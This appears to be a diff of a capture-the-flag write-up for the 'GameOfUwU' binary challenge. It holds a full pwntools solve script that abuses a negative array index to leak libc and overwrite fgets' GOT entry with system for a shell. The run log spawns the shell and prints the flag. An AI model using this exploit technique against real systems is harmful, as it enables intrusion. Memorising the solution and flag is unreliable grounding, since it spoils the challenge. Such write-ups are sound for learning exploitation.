@@ -1,24 +1,106 @@
-# Challenge description:
+# GameOfUwU 
+Author: a1668k  
+Binary  
+Description  
+Solves 2  
+
+Do you want to Play a game?? (❍ᴥ❍ʋ) Let play "Game of UwU"!  
+
+GameOfUwU  
+
+`nc chal.firebird.sh 35029`
+
+Since the server binary is unable to use gdb to debug because of system("clear"), the king of UwU is so nice that gives you a version for you to debug  
+
+GameOfUwU_noclear  
+
+At least, my solve script works on both version (つ´ω`)つ  
+
+## Full solve script
+
+```py
+from pwn import * 
+import time 
+binary = ("./GameOfUwU_patched")
+
+p = process(binary)
+p = remote("chal.firebird.sh", 35029)
+libc = ELF('./libc.so.6')
+
+elf = ELF(binary)
+s = 'b*edit_nickname+127'
+#gdb.attach(p, s)
+p.sendline(b'1') # press any key to continue
+
+#context.log_level = 'debug'
+# overwriting FireUwU
+
+p.recvuntil(b"  1: Play    2: View Team    3: Edit Nickname    0: Exit\n  ")
+p.sendline(b'3')
+
+p.recvuntil(b"  Whose nickname do you want to edit? (Please enter an index)\n  ")
+p.sendline(b'1')
+p.sendlineafter(b"What is its new nickname?", b'/bin/sh')
+
+
+p.recvuntil(b"  1: Play    2: View Team    3: Edit Nickname    0: Exit\n  ")
+p.sendline(b'3')
+p.recvuntil(b"  Whose nickname do you want to edit? (Please enter an index)\n  ")
+
+p.sendline(b'-2')
+p.recvuntil(b"  Please get a new name to ")
+
+# parse the leaked address to int, hex and potentially further conver to other formats 
+GOT_leak = int.from_bytes(p.recvuntil(b"!", drop = True), 'little')
+libc.address = GOT_leak - libc.sym['rand'] # calculate the libc base
+print(hex(GOT_leak)) # debugging 
+print(hex(libc.address)) # debugging 
+#print(hex(libc.sym['rand']))
+
+
+# preserving the leaked address, for a second entry to overwrite fgets (success)
+preserved = GOT_leak.to_bytes(6, 'little')
+p.sendlineafter(b"What is its new nickname?", preserved)
+
+
+system_addr = libc.sym['system'] # calculate the offset of system 
+print(hex(system_addr)) # debugging 
+
+
+# Going to overwrite fgets, overwrite is possible know by manual test 
+p.recvuntil(b"  1: Play    2: View Team    3: Edit Nickname    0: Exit\n  ")
+p.sendline(b'3')
+p.recvuntil(b"  Whose nickname do you want to edit? (Please enter an index)\n  ")
+
+p.sendline(b'-7')
+p.recvuntil(b"  Please get a new name to ")
+payload = b'A' * 8 + system_addr.to_bytes(6, 'little') # index 6 to access srand and write downwards (up acutally)
+p.sendlineafter(b"What is its new nickname?", payload)
+
+
+
+
+# pass /bin/sh into fgets!!, commented to pass in manually kk4
+time.sleep(0.5)
+p.recvuntil(b"  1: Play    2: View Team    3: Edit Nickname    0: Exit\n  ")
+p.sendline(b'3')
+time.sleep(0.5)
+p.recvuntil(b"  Whose nickname do you want to edit? (Please enter an index)\n  ")
+
+p.sendline(b'1')
+time.sleep(0.5)
+p.sendlineafter(b"What is its new nickname?", b'/bin/sh')
+
+
+p.interactive()
+
+
+
+#print(hex(libc.address))
+#print(hex(libc.sym['rand']))
 ```
-100 pts
-Author: a1668k
-Binary
-Description
-Solves 
-2
-Do you want to Play a game?? (❍ᴥ❍ʋ) Let play "Game of UwU"!
 
-GameOfUwU[zip] 
-
-nc chal.firebird.sh 35029
-
-Since the server binary is unable to use gdb to debug because of system("clear"), the king of UwU is so nice that gives you a version for you to debug
-
-GameOfUwU_noclear[file] 
-
-At least, my solve script works on both version (つ´ω`)つ
-```
-# Source of program
+## Source code
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -387,7 +469,7 @@ void edit_nickname() {
 }
 ```
 ### Illegal memory accessing 
-it is vulnerable because the `TEAM` array index checking condition does not check for negative indecies:  
+The program is vulnerable because the `TEAM` array index checking condition does not check for negative indecies:  
 ```c
 if (index <= TEAM_SIZE) {
 ```
@@ -518,88 +600,39 @@ After:
 ### Putting `/bin/sh` into `fgets` aka `system`
 
 After we successfully hijacked `fgets` with `system`, it is now time to pass in `/bin/sh`.
-The first step ( mentioned above), is to first rename one of the pokemon, here we choose the default one `FirebUwU` and rename it to `/bin/sh`. This step can be done any time before we choose to edit nickname after hijacking `fgets`. Because `fgets` would surely be called during the process of renaming, and we don't want any weird arguments being passed in. 
+The first step ( mentioned above), is to first rename one of the pokemon, here we choose the default one `FirebUwU` and rename it to `/bin/sh`. This step can be done any time before we choose to edit nickname after hijacking `fgets`. Because `fgets` would surely be called during the process of renaming, and we don't want any weird arguments being passed in. Anyway, we get the shell after that!  
 
-## Full solve script
-
-```py
-from pwn import * 
-import time 
-binary = ("./GameOfUwU_patched")
-
-p = process(binary)
-p = remote("chal.firebird.sh", 35029)
-libc = ELF('./libc.so.6')
-
-elf = ELF(binary)
-s = 'b*edit_nickname+127'
-#gdb.attach(p, s)
-p.sendline(b'1') # press any key to continue
-
-#context.log_level = 'debug'
-# overwriting FireUwU
-
-p.recvuntil(b"  1: Play    2: View Team    3: Edit Nickname    0: Exit\n  ")
-p.sendline(b'3')
-
-p.recvuntil(b"  Whose nickname do you want to edit? (Please enter an index)\n  ")
-p.sendline(b'1')
-p.sendlineafter(b"What is its new nickname?", b'/bin/sh')
-
-
-p.recvuntil(b"  1: Play    2: View Team    3: Edit Nickname    0: Exit\n  ")
-p.sendline(b'3')
-p.recvuntil(b"  Whose nickname do you want to edit? (Please enter an index)\n  ")
-
-p.sendline(b'-2')
-p.recvuntil(b"  Please get a new name to ")
-
-# parse the leaked address to int, hex and potentially further conver to other formats 
-GOT_leak = int.from_bytes(p.recvuntil(b"!", drop = True), 'little')
-libc.address = GOT_leak - libc.sym['rand'] # calculate the libc base
-print(hex(GOT_leak)) # debugging 
-print(hex(libc.address)) # debugging 
-#print(hex(libc.sym['rand']))
-
-
-# preserving the leaked address, for a second entry to overwrite fgets (success)
-preserved = GOT_leak.to_bytes(6, 'little')
-p.sendlineafter(b"What is its new nickname?", preserved)
-
-
-system_addr = libc.sym['system'] # calculate the offset of system 
-print(hex(system_addr)) # debugging 
-
-
-# Going to overwrite fgets, overwrite is possible know by manual test 
-p.recvuntil(b"  1: Play    2: View Team    3: Edit Nickname    0: Exit\n  ")
-p.sendline(b'3')
-p.recvuntil(b"  Whose nickname do you want to edit? (Please enter an index)\n  ")
-
-p.sendline(b'-7')
-p.recvuntil(b"  Please get a new name to ")
-payload = b'A' * 8 + system_addr.to_bytes(6, 'little') # index 6 to access srand and write downwards (up acutally)
-p.sendlineafter(b"What is its new nickname?", payload)
-
-
-
-
-# pass /bin/sh into fgets!!, commented to pass in manually kk4
-time.sleep(0.5)
-p.recvuntil(b"  1: Play    2: View Team    3: Edit Nickname    0: Exit\n  ")
-p.sendline(b'3')
-time.sleep(0.5)
-p.recvuntil(b"  Whose nickname do you want to edit? (Please enter an index)\n  ")
-
-p.sendline(b'1')
-time.sleep(0.5)
-p.sendlineafter(b"What is its new nickname?", b'/bin/sh')
-
-
-p.interactive()
-
-
-
-#print(hex(libc.address))
-#print(hex(libc.sym['rand']))
+```
+┌──(kali㉿kali)-[~/Desktop/CTF/GameOfUwU]
+└─$ python solve.py         
+[+] Starting local process './GameOfUwU_patched': pid 58047
+[+] Opening connection to chal.firebird.sh on port 35029: Done
+[*] '/home/kali/Desktop/CTF/GameOfUwU/libc.so.6'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+[*] '/home/kali/Desktop/CTF/GameOfUwU/GameOfUwU_patched'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    RUNPATH:    b'.'
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+0x7fdaafc47760
+0x7fdaafc01000
+0x7fdaafc51d70
+[*] Switching to interactive mode
+ 
+  $ ls
+GameOfUwU
+flag.txt
+$ cat flag.txt
+flag{g07ch4!k1n9_0f_UwU_w45_c4u9h7!}$
 ```
